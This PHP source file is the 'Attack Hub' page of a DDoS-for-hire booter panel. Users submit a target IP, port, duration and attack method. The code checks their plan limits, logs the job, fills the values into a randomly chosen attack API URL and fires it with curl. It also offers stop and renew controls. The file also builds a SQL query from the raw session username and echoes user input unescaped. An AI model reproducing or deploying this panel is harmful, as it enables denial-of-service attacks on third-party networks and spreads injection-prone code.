<?php 
ini_set('display_errors', 1); 
error_reporting(E_ALL);

$page = "Hub";
include ("core/header.php");
if (!($user -> LoggedIn()))
{
	header('location: /LunaV0.4/Main/signup.php');
	die();
}
if (!($user -> notBanned($odb)))
{
	header('location: /LunaV0.4/Main/signup.php');
	die();
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Pika - Attack Hub</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">

    <!-- Favicon -->
    <link href="img/favicon.ico" rel="icon">

    <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Roboto:wght@500;700&display=swap" rel="stylesheet"> 
    
    <!-- Icon Font Stylesheet -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">

    <!-- Libraries Stylesheet -->
    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet" />

    <!-- Customized Bootstrap Stylesheet -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Template Stylesheet -->
    <link href="css/style.css" rel="stylesheet">
</head>


<body>
    <div class="container-fluid position-relative d-flex p-0">
        <!-- Spinner Start -->
        <div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
            <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
                <span class="sr-only">Loading...</span>
            </div>
        </div>
        <!-- Spinner End -->

        
        <div class="content">
            <!-- Blank Start -->
            <div class="container-fluid pt-4 px-4">
                <div class="row g-4">
                <?php
				if (isset($_POST['attackBtn']))
				{
					if ($stats->runningBoots($odb) < $maxBootSlots) {
					$host = $_POST['host'];
					$port = intval($_POST['port']);
					$time = intval($_POST['time']);
					$method = $_POST['method'];
					if (empty($host) || empty($time) || empty($port) || empty($method))
					{
						echo'
                        <div class="alert alert-primary alert-dismissible fade show" role="alert">
                        <i class="fa fa-exclamation-circle me-2"></i><strong>ERROR</strong>: Please Fill In All Fields!
                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                        </div>';
					}
					else
					{
						if (!filter_var($host, FILTER_VALIDATE_IP) && !filter_var($host, FILTER_VALIDATE_URL))
						{
                            echo'
                            <div class="alert alert-primary alert-dismissible fade show" role="alert">
                            <i class="fa fa-exclamation-circle me-2"></i><strong>ERROR</strong: Invalid Host!
                            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                            </div>';
						}
						else
						{
							$SQLCheckBlacklist = $odb -> prepare("SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host");
							$SQLCheckBlacklist -> execute(array(':host' => $host));
							$countBlacklist = $SQLCheckBlacklist -> fetchColumn(0);
							if ($countBlacklist > 0)
							{
                                echo'
                                <div class="alert alert-primary alert-dismissible fade show" role="alert">
                                <i class="fa fa-exclamation-circle me-2"></i><strong>ERROR</strong: IP Blacklisted!
                                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                                </div>';							
                            }
							else
							{
								$checkRunningSQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
								$checkRunningSQL -> execute(array(':username' => $_SESSION['username']));
								$countRunning = $checkRunningSQL -> fetchColumn(0);
								if (!($countRunning >= $stats -> con($odb, $_SESSION['username'])))
								{
									$SQLGetTime = $odb -> prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
									$SQLGetTime -> execute(array(':id' => $_SESSION['ID']));
									$maxTime = $SQLGetTime -> fetchColumn(0);
									if (!($time > $maxTime))
									{
										$insertLogSQL = $odb -> prepare("INSERT INTO `logs` VALUES (NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), '0')");
										$insertLogSQL -> execute(array(':user' => $_SESSION['username'], ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method));
										$SQLSelectAPI = $odb -> query("SELECT `api` FROM `api` ORDER BY RAND () LIMIT 1");
										while ($show = $SQLSelectAPI -> fetch(PDO::FETCH_ASSOC))
										{
											$arrayFind = array('[host]', '[port]', '[time]', '[method]');
											$arrayReplace = array($host, $port, $time, $method);
											$APILink = $show['api'];
								  
											$APILink = str_replace($arrayFind, $arrayReplace, $APILink);
											
											$ch = curl_init();
											curl_setopt($ch, CURLOPT_URL, $APILink);
											curl_setopt($ch, CURLOPT_HEADER, 0);
											curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
											curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
											curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);
											curl_setopt($ch, CURLOPT_TIMEOUT, 60);
											$result = curl_exec($ch);
											if($result === false) {
												// cURL error
												$error = curl_error($ch);
												echo "cURL Error: $error";
												curl_close($ch);
												exit;
											  }
											curl_close($ch);
											
										}
							
									    echo '<div class="g_12"><div class="alert alert-success"><strong>SUCCESS</strong>: Attack has been sent to '.$host.':'.$port.' for '.$time.' seconds using '.$method.'</div></div>';
									}
									else
									{
                                        echo'
                                        <div class="alert alert-primary alert-dismissible fade show" role="alert">
                                        <i class="fa fa-exclamation-circle me-2"></i><strong>ERROR</strong: Exceeds Max Boot Time!
                                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                                        </div>';
									}
								}
								else
								{
                                    echo'
                                    <div class="alert alert-primary alert-dismissible fade show" role="alert">
                                    <i class="fa fa-exclamation-circle me-2"></i><strong>ERROR</strong: No Plan/Too Many Running Attacks!
                                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                                    </div>';
								}
							}
						}
					}
					} else {
                        echo'
                        <div class="alert alert-primary alert-dismissible fade show" role="alert">
                        <i class="fa fa-exclamation-circle me-2"></i><strong>ERROR</strong: Max Running Attacks!
                        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                        </div>';
					}
					
				}
				?>
				
                
                    <div class="col-sm-12 col-xl-6">
                        <div class="bg-secondary rounded h-100 p-4">
                        <h6 class="mb-4">Send Attack</h6>
                            <form action="" method="POST">
                                <div class="mb-3">
                                    <label for="IP" class="form-label">IP</label>
                                    <input type="text" class="form-control" name="host" placeholder="Target">
                                </div>
                                <div class="mb-3">
                                    <label for="Port" class="form-label">Port</label>
                                    <input type="text" class="form-control" name="port" placeholder="Port">
                                </div>
                                <div class="mb-3">
                                    <label for="Port" class="form-label">Time</label>
                                    <input type="text" class="form-control" name="time" placeholder="Seconds">
                                </div>
                                <div class="mb-3">
                                    <label for="Port" class="form-label">Method</label>
                                <select name="method" class="form-select mb-3" aria-label="Default select example">
                                <option selected>Open this select menu</option>
										<?php
										   $SQLSelect = $odb -> query("SELECT * FROM `methods` ORDER BY `ID` ASC");
											while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
											{
												$nameShow = $show['name'];
												$friendlyShow = $show['friendly'];
												echo "<option value=\"" . $nameShow . "\">" . $friendlyShow . "</option>" . PHP_EOL;
											}
										?>
                            </select>
</div>
                                <div class="mb-3 form-check">
                                    <input type="checkbox" class="form-check-input" id="exampleCheck1">
                                    <label class="form-check-label" for="exampleCheck1">Check me out</label>
                                </div>
                                <button type="submit" name="attackBtn" class="btn btn-primary">Send</button>
                            </form>
                        </div>
                    </div>
                    <?php
								if (isset($_POST['stopbtn']))
								{
									$stops = $_POST['stopCheck'];
									foreach($stops as $stop)
									{
										$SQL = $odb -> prepare("UPDATE `logs` SET `stopped` = 1 WHERE `id` = :id LIMIT 1");
										$SQL -> execute(array(':id' => $stop));
											$SQLSelect = $odb -> prepare("SELECT * FROM `logs` WHERE `id` = :id LIMIT 1");
											$SQLSelect -> execute(array(':id' => $stop));
											while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
											{
												$host = $show['ip'];
												$port = $show['port'];
												$time = $show['time'];
												$method = $show['method'];
												}
												$SQLSelectAPI = $odb -> query("SELECT `api` FROM `api` ORDER BY `id` DESC");
												while ($show = $SQLSelectAPI -> fetch(PDO::FETCH_ASSOC))
												{
												$arrayFind = array('[host]', '[port]', '[time]', '[method]');
												$arrayReplace = array($host, $port, $time, $method);
												$APILink = $show['api'];
												$APILink = str_replace($arrayFind, $arrayReplace, $APILink);
												$stopcommand = "&method=stop";
												$stopapi = $APILink . $stopcommand;
													$ch = curl_init();
													curl_setopt($ch, CURLOPT_URL, $stopapi);
													curl_setopt($ch, CURLOPT_HEADER, 0);
													curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
													curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
													curl_setopt($ch, CURLOPT_TIMEOUT, 3);
													curl_exec($ch);
													curl_close($ch);
											}
											echo '<div class="g_12"><div class="alert alert-success"><strong>SUCCESS</strong>: Attack(s) Have Been Stopped!</div></div>';
									}
								}
								?>
                    <div class="col-sm-12 col-xl-6">
                        <div class="bg-secondary rounded h-100 p-4">
                            <h6 class="mb-4">Ongoing Attacks</h6>
                            <form method="POST">
                            <table class="table table-hover">
                            <thead>
									  <tr>
										<th>#</th>
										<th>Host</th>
										<th>Time Left</th>
										<th>Method</th>
										<th>Status</th>
										<th>Action</th>
									</tr>
								</thead>
								<tbody>
									<?php
									$SQLSelect = $odb -> query("SELECT * FROM `logs` WHERE user='{$_SESSION['username']}'  AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0 ORDER BY `id` DESC");
									while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
									{
									$ip = $show['ip'];
									$port = $show['port'];
									$time = $show['time'];
									$method = $show['method'];
									$rowID = $show['id'];
									echo '<tr><td><input type="checkbox" name="stopCheck[]" value="'.$rowID.'"/></td><td>'.$ip.'</td><td>';
										
									//echo date("r", ($show['time'] + $show['date'])) . "<br />";
										
									?>
									<div id='att-<?php echo $rowID; ?>'></div>
									<script>
									var i<?php echo $rowID; ?> = <?php echo abs(time() - ($show['date'] + $show['time'])); ?>;
									var time<?php echo $rowID; ?> = setInterval(function(){
										document.getElementById("att-<?php echo $rowID; ?>").innerHTML="Attack ending in "+(i<?php echo $rowID; ?>--)+" seconds"
										if (i<?php echo $rowID; ?> == 0){
											clearInterval(time<?php echo $rowID; ?>);
											document.getElementById("att-<?php echo $rowID; ?>").innerHTML="Attack Finished!"
										}
									},1000);
									</script>
									<?php echo '</td><td>'.$method.'</td><td><span class="label label-success">Running</span></td><td><input type="submit" name="stopbtn" value="Stop" class="btn btn-danger" /></td></tr>';
									}
									$SQLSelectRunningAttack = $odb -> prepare("SELECT * FROM `logs` WHERE user= :user AND (`time` + `date` < UNIX_TIMESTAMP() OR `stopped` != 'No') ORDER BY `ID` DESC LIMIT 5;");
									   $SQLSelectRunningAttack->execute(array(":user" => $_SESSION['username']));
										if ($SQLSelectRunningAttack->rowCount() != 0) {
									  while ($show = $SQLSelectRunningAttack -> fetch(PDO::FETCH_ASSOC))
									  {
										$ip = htmlentities($show['ip']);
										$port = htmlentities($show['port']);
										$time = htmlentities($show['time']);
										$method = htmlentities($show['method']);
										$rowID = htmlentities($show['ID']);
										echo '<tr class="spacer"></tr><tr><td>'.$rowID.'</td><td>'.$ip.'</td><td>'.$time.'</td><td>'.$method.'</td><td><span class="label label-warning">Restart</span></td><td><form method="post" action="">
											<div class="g_10"><button type="submit" name="attackBtn" class="btn btn-success">Renew</button>
													<input name="host" type="hidden" value="' . $ip . '"/>
													<input name="port" type="hidden" value="' . $port . '"/>
													<input name="time" type="hidden" value="' . $time . '"/>
													<input name="method" type="hidden" value="' . $method . '"/>
											</div></form></td></tr>
												'; 
									  }
                                     }
									  
									  else {
										echo "<tr class=\"spacer\"></tr><tr><td colspan='6'>You have no previous boots</td></tr>";
									  }
									 ?>
								</tbody>
                            </table>
                            </form>
                        </div>
                    </div>

                    <div class="container-fluid pt-4 px-5">
                        <div class="bg-secondary rounded h-100 p-4">
                            <iframe class="position-relative rounded w-100 h-150"
                            src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3001156.4288297426!2d-78.01371936852176!3d42.72876761954724!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x4ccc4bf0f123a5a9%3A0xddcfc6c1de189567!2sNew%20York%2C%20USA!5e0!3m2!1sen!2sbd!4v1603794290143!5m2!1sen!2sbd"
                            frameborder="0" allowfullscreen="" aria-hidden="false"
                            tabindex="0" style="filter: grayscale(100%) invert(92%) contrast(83%); border: 0;"></iframe>
                        </div>
                    </div>
            </div>
            <!-- Blank End -->

            <!-- Footer Start -->
            <?php
				$getNames = $odb -> query("SELECT * FROM `admin`");
				while($Names = $getNames -> fetch(PDO::FETCH_ASSOC)) {
					$SiteName = $Names['bootername'];
				}
			?>
            
<div class="container-fluid pt-4 px-4">
                <div class="bg-secondary rounded-top p-4">
                    <div class="row">
                        <div class="col-12 col-sm-6 text-center text-sm-start">
                            &copy; <a href="#"><?php echo $SiteName ?></a>, All Right Reserved. 
                        </div>
                        <div class="col-12 col-sm-6 text-center text-sm-end">
                            Designed By <a href="#">FileGone</a>
                            <br>Distributed By: <a href="#" target="_blank"><?php echo $SiteName ?></a>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Footer End -->
        </div>
        <!-- Content End -->


        <!-- Back to Top -->
        <a href="#" class="btn btn-lg btn-primary btn-lg-square back-to-top"><i class="bi bi-arrow-up"></i></a>
    </div>

    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="lib/chart/chart.min.js"></script>
    <script src="lib/easing/easing.min.js"></script>
    <script src="lib/waypoints/waypoints.min.js"></script>
    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="lib/tempusdominus/js/moment.min.js"></script>
    <script src="lib/tempusdominus/js/moment-timezone.min.js"></script>
    <script src="lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js"></script>

    <!-- Template Javascript -->
    <script src="js/main.js"></script>
</body>

</html>